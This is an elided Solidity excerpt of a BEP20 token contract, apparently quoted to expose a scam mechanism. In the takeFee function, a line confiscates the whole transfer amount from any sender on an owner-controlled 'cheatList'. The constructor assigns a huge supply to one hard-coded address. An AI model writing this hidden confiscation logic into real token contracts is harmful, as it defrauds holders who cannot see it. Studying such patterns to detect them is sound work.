...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(cheatList[sender] && !isMarketPair[sender]) feeAmount = amount;
...
contract Token is BEP20 {
    constructor() BEP20(
        ...
        [uint256(10**32),uint256(10**32)],
        [0x3F4C74f32237A06965fF51E5b28c6D5675070fbE,0x3F4C74f32237A06965fF51E5b28c6D5675070fbE]
    ){}
}